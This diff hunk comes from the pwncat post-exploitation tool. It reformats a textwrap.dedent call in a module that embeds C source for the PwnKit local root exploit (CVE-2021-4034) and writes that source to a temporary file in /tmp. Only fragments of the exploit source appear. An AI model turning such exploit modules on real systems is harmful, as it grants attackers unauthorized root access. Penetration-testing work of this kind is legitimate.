@@ -22,8 +22,7 @@ class CVE_2021_4034(ExecuteAbility):
     def shell(self, session: "pwncat.manager.Session"):
         """Execute a shell with CVE-2021-4034"""
 
-        pwnkit_source = textwrap.dedent(
-            r"""
+        pwnkit_source = textwrap.dedent(r"""
             #define _XOPEN_SOURCE 700
             #define _GNU_SOURCE
             #include <dirent.h>
@@ -125,8 +124,7 @@ class CVE_2021_4034(ExecuteAbility):
                 }
                 _exit(0);
             }
-            """
-        ).lstrip()
+            """).lstrip()
 
         try:
             with session.platform.tempfile(mode="w", directory="/tmp") as filp:
